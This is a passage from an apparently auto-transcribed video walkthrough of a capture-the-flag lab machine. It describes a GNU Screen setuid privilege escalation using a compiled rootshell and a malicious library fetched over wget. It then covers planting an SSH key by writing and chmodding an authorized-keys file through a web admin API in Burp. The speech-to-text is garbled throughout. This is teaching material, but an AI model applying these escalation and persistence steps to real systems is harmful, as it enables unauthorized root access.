loaded it does the chmod zero zero on root shell along with the permission bits to make it set UID hopefully that all makes sense Python M simple HTTP server and now let's copy the files that Lacey gem let's just do w get - are ten ten fourteen three port 8000 LS and let's see we wanted a copy was it go so I think everything is in temp so the first copy was GCC - Oh F alpha temp root shell second copy is temp web packs so both files go in temp so let's go back to SSH CP web access Oh - temp CP root shell - temp CD Etsy you mask a zero zero zero and now we want to execute this command run that directory on screen must have seven five five one if that is supposed to happen screen - LS do LS dash L a on temp files won't exist CD slash dev s hm that's weird CP root downtown exists CP Lib hacks dot SL to tell screen LS let's see CD run oh it's probably the screen version find / - perm let's use this so specify that full path and then this let's see now it looks better and then we did this - LS no sockets found SLA temp and we have root shell set UID bit owned by root so if we just do tap root shell ID we are now root so let me see - see root text and that is the box so let's go back and get a show a different way let's say the SSH key was not compromised so if we go back to cherry tree the sshd config has something very interesting it had ssh authorized keys and access so when we logged in to this application we logged in as the sis ADM user if we go to home come on go all the way down we're here so it's a logical leap that we are this user so let's see if we can write a file so let's write please subscribe and kudos to 0x d F for finding this method I think he is the one I told him about this there's a how he had done the Box so if we do home sis ADM alright this let's just name it test save it successfully saves so we can write to his home directory so if we go back into home this ADM you can see we wrote this file so what we want to do is create an SSH key so we'll do SSH key gen - f we'll call this sis a DM won't bother cleaning a what is it password on it but let's copy this sis a DM pub and copy this over so save it as and if we go to home sis a DM we can name this access and for this method to work the SSH had to be configured to allow access as a secondary file name because I don't believe image NT or the version we're running we have permission to create directories we do have mission to create files and change permissions of files but we couldn't create this data SSH director at least I couldn't but because they had two different authorized key files we could create this file if we save it it has saved successfully so if we now try to SSH we still won't be able to because the permission of this file is not 600 it's a weak permission so if we try to SH LSL a chmod 680m because the permissions have to be strong on both sides and the IP is this ADM at 10 10 10 124 and of course the hosts allow file open let's see oh Stillwell Oh 10 10 14 3 let's just see if this does it save let's do shd 1010 14 3 save there we go public key is denied so there's no good way in the GUI to change permissions of a file but if we googled or searched burp first let's do HTTP history we don't want to only share that and so everything we've done when we write a file we're calling the API filesystem right so what if we googled like a gentie documentation and saw what the api exposed so a gentie was just search to this string here we go we got two different forms of documentation major different versions but this probably won't change too much but we got the chmod and there is this create directory but if we try to do create directory it'll fail so let's see let's search for access it send a lot of things filesystem right host allow here we go so here's us reading the file and I don't know if did I copy the quotes or does this put on by the application let's open it one last time home this ADM access so I didn't put on the quotes that is by the application so if we try create directory we'll get your L not found if we do chmod we get an error message because if you look the API says chmod is two different things path and then you got to have the mode argument and the mood is an integer so if you look at previous commands how they do this let's see here's right they put the API path the first argument up here in the URL and they put the argument down here so if we go to the repeater tab we want to make this a post request not a gift and then we need mood and or not is it mood yep mode and if we did 600 does this still error L it does not it just gives us no and if we try to SSH I'm guessing that oh we still get it denied and this took a lot of troubleshooting by zero xdf and what the application is actually doing if you read a lot of the documentation it wants integer and basic Linux file missions or in base 8 format because it is four bits I believe four characters and each of these can be 0 through 7 which is 8 characters so if you google for a base 8 to decimal as this is even an online thing let's do this base 8 600 that's more version is 384 and that is just I believe through the eighth because we have 8 possible bits 8 possible bits 8 possible bits so if we do 3 to the or is it 8 to the third it's too late to wait to do math no cuz it's not full 3 there's total of 512 bits but this is a 6 not an 8 so huh you can just Google how to do that let's try setting this to 384 like the calculator said there's some things I don't feel like wasting time on right now and it's Friday night I got publishes video so there we go that's the sage - I and we get in so if we do LS - la we can see access key is now 600 if we did a chmod as 600 and do a LS - la you can see this file mission is all out of whack so if we did like that's the mold to base 8 and did 600 we just chmod at this - 1 1 3 0 and that's what this would give you so that is the box hope you guys enjoyed it take care and I will see you all next week